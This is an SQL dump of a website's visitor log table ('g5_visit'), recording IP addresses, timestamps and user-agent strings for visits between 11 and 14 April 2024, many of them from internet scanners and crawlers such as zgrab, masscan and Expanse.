INSERT INTO `g5_visit` VALUES ('1294', '185.150.26.246', '2024-04-11', '16:16:55', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1295', '205.210.31.130', '2024-04-11', '16:19:51', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1296', '194.120.230.95', '2024-04-11', '16:23:21', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1297', '192.155.90.220', '2024-04-11', '16:26:10', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1298', '192.155.90.118', '2024-04-11', '16:29:07', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1299', '51.254.59.113', '2024-04-11', '16:30:36', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1300', '152.42.229.236', '2024-04-11', '16:57:52', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1301', '35.203.210.38', '2024-04-11', '17:22:10', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1302', '221.207.35.77', '2024-04-11', '17:34:00', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1303', '171.36.6.123', '2024-04-11', '17:34:26', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1304', '61.158.26.229', '2024-04-11', '17:34:41', '', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1305', '172.104.11.46', '2024-04-11', '18:24:51', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1306', '45.79.181.179', '2024-04-11', '19:00:40', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1307', '172.105.128.11', '2024-04-11', '19:43:25', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1308', '35.203.210.35', '2024-04-11', '19:44:15', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1309', '46.174.191.32', '2024-04-11', '19:53:48', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1310', '69.164.217.74', '2024-04-11', '20:32:56', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1311', '216.218.206.67', '2024-04-11', '21:09:51', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1312', '192.241.219.51', '2024-04-11', '23:00:21', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1313', '45.128.232.213', '2024-04-12', '00:00:55', '', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1314', '185.224.128.43', '2024-04-12', '00:39:16', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1315', '45.79.181.251', '2024-04-12', '00:51:44', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1316', '172.105.128.11', '2024-04-12', '01:43:34', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1317', '45.79.181.94', '2024-04-12', '01:49:25', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1318', '34.140.108.54', '2024-04-12', '02:15:05', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1319', '69.164.217.74', '2024-04-12', '02:30:43', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1320', '45.79.181.179', '2024-04-12', '02:32:02', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1321', '45.79.168.172', '2024-04-12', '02:32:45', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1322', '66.175.213.4', '2024-04-12', '02:38:13', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1323', '45.79.181.223', '2024-04-12', '03:07:34', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1324', '91.92.243.100', '2024-04-12', '03:22:08', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1325', '35.187.71.84', '2024-04-12', '03:29:55', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1326', '146.19.24.28', '2024-04-12', '03:36:35', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1327', '172.104.11.51', '2024-04-12', '04:23:42', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1328', '192.155.90.220', '2024-04-12', '04:24:16', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1329', '198.74.56.46', '2024-04-12', '04:24:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1330', '45.79.172.21', '2024-04-12', '04:24:53', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1331', '172.104.11.46', '2024-04-12', '04:25:27', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1332', '194.120.230.94', '2024-04-12', '05:00:10', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1333', '194.120.230.95', '2024-04-12', '05:01:02', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1334', '45.79.181.104', '2024-04-12', '05:12:41', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1335', '192.155.88.231', '2024-04-12', '06:15:05', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1336', '185.150.26.246', '2024-04-12', '06:35:47', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1337', '45.79.163.53', '2024-04-12', '06:57:58', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1338', '192.155.90.118', '2024-04-12', '08:44:58', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1339', '172.104.210.105', '2024-04-12', '08:54:35', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1340', '185.150.26.240', '2024-04-12', '09:53:12', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1341', '165.154.206.250', '2024-04-12', '10:04:15', '', 'curl/7.29.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1342', '152.32.134.89', '2024-04-12', '10:07:42', '', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/546.51 (KHTML, like Gecko) Chrome/87.0.1818 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1343', '172.105.128.13', '2024-04-12', '10:12:23', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1344', '35.203.211.4', '2024-04-12', '10:40:49', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1345', '69.164.217.245', '2024-04-12', '10:43:28', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1346', '45.79.128.205', '2024-04-12', '10:44:15', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1347', '172.105.128.12', '2024-04-12', '10:44:51', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1348', '162.216.149.227', '2024-04-12', '12:35:22', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1349', '162.216.149.97', '2024-04-12', '12:46:58', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1350', '185.180.143.7', '2024-04-12', '12:48:12', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1351', '59.94.99.244', '2024-04-12', '13:21:25', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1352', '206.189.105.58', '2024-04-12', '13:34:13', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1353', '193.106.29.125', '2024-04-12', '13:42:50', '', 'Mozilla/5.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1354', '117.216.254.245', '2024-04-12', '14:44:51', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1355', '45.33.80.243', '2024-04-12', '14:47:33', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1356', '34.76.96.55', '2024-04-12', '16:20:22', '', 'python-requests/2.31.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1357', '172.104.11.4', '2024-04-12', '16:49:46', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1358', '205.210.31.154', '2024-04-12', '17:01:33', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1359', '64.62.197.19', '2024-04-12', '17:07:50', '', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1360', '46.174.191.32', '2024-04-12', '17:49:27', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1361', '50.31.21.7', '2024-04-12', '17:57:26', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1362', '198.235.24.43', '2024-04-12', '18:12:32', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1363', '178.79.183.251', '2024-04-12', '18:45:19', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1364', '198.235.24.133', '2024-04-12', '19:02:22', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1365', '172.104.11.34', '2024-04-12', '20:07:21', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1366', '185.242.226.10', '2024-04-12', '21:57:31', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1367', '157.55.39.7', '2024-04-12', '22:23:20', '', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1368', '212.70.149.134', '2024-04-12', '23:07:42', '', 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1369', '185.213.169.70', '2024-04-12', '23:11:01', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7', '', '', '');
INSERT INTO `g5_visit` VALUES ('1370', '172.214.141.49', '2024-04-12', '23:56:42', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1371', '185.150.26.246', '2024-04-13', '00:00:21', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1372', '138.68.240.171', '2024-04-13', '00:14:50', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1373', '45.79.172.21', '2024-04-13', '00:16:10', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1374', '107.170.240.30', '2024-04-13', '00:43:27', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1375', '167.94.138.127', '2024-04-13', '00:47:11', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1376', '192.155.88.231', '2024-04-13', '00:56:29', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1377', '198.199.100.7', '2024-04-13', '01:35:15', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1378', '45.79.181.223', '2024-04-13', '01:35:47', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1379', '45.79.181.104', '2024-04-13', '01:37:10', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1380', '146.19.24.28', '2024-04-13', '01:53:08', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1381', '185.224.128.43', '2024-04-13', '02:21:46', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46', '', '', '');
INSERT INTO `g5_visit` VALUES ('1382', '172.105.128.11', '2024-04-13', '02:48:45', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1383', '193.222.96.163', '2024-04-13', '04:54:40', '', 'Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1384', '172.104.210.105', '2024-04-13', '05:17:28', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1385', '45.79.181.179', '2024-04-13', '05:17:58', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1386', '205.210.31.156', '2024-04-13', '06:01:15', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1387', '117.245.248.155', '2024-04-13', '07:10:36', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1388', '45.79.163.53', '2024-04-13', '07:23:38', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1389', '172.104.11.51', '2024-04-13', '07:24:13', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1390', '172.104.11.4', '2024-04-13', '07:25:17', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1391', '172.104.11.34', '2024-04-13', '07:25:56', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1392', '192.155.90.220', '2024-04-13', '07:26:05', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1393', '172.105.128.12', '2024-04-13', '07:26:39', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1394', '45.33.80.243', '2024-04-13', '07:27:28', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1395', '66.175.213.4', '2024-04-13', '07:28:18', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1396', '192.155.90.118', '2024-04-13', '07:30:03', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1397', '45.79.128.205', '2024-04-13', '07:44:32', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1398', '172.105.128.13', '2024-04-13', '07:52:14', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1399', '198.74.56.46', '2024-04-13', '08:48:15', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1400', '185.140.163.236', '2024-04-13', '08:55:17', '', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1401', '198.235.24.59', '2024-04-13', '09:27:21', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1402', '45.79.168.172', '2024-04-13', '10:11:05', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1403', '172.104.11.46', '2024-04-13', '10:11:21', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1404', '35.203.211.168', '2024-04-13', '10:26:40', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1405', '35.203.211.46', '2024-04-13', '10:46:06', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1406', '46.174.191.30', '2024-04-13', '13:17:31', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko', '', '', '');
INSERT INTO `g5_visit` VALUES ('1407', '15.204.52.61', '2024-04-13', '13:22:09', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1408', '45.79.181.94', '2024-04-13', '13:50:37', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1409', '213.32.39.39', '2024-04-13', '13:59:14', '', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', '', '', '');
INSERT INTO `g5_visit` VALUES ('1410', '69.164.217.74', '2024-04-13', '14:00:34', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1411', '45.79.181.251', '2024-04-13', '15:07:36', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1412', '103.203.57.7', '2024-04-13', '15:41:34', '', 'HTTP Banner Detection (https://security.ipip.net)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1413', '200.255.164.35', '2024-04-13', '18:39:16', '', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1414', '205.210.31.129', '2024-04-13', '18:49:14', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1415', '184.105.139.70', '2024-04-13', '18:49:57', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1416', '205.210.31.210', '2024-04-13', '18:52:29', '', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scan', '', '', '');
INSERT INTO `g5_visit` VALUES ('1417', '174.138.81.162', '2024-04-13', '19:33:58', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1418', '69.164.217.245', '2024-04-13', '20:25:18', '', 'Mozilla/5.0 zgrab/0.x', '', '', '');
INSERT INTO `g5_visit` VALUES ('1419', '87.236.176.219', '2024-04-13', '22:39:12', '', 'Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)', '', '', '');
INSERT INTO `g5_visit` VALUES ('1420', '185.180.143.49', '2024-04-13', '22:46:34', '', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1421', '206.72.198.135', '2024-04-13', '23:01:53', '', '', '', '', '');
INSERT INTO `g5_visit` VALUES ('1422', '45.79.181.179', '2024-04-14', '00:03:28', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1423', '192.155.90.118', '2024-04-14', '00:42:55', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
INSERT INTO `g5_visit` VALUES ('1424', '172.104.11.51', '2024-04-14', '00:56:54', '', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', '', '', '');
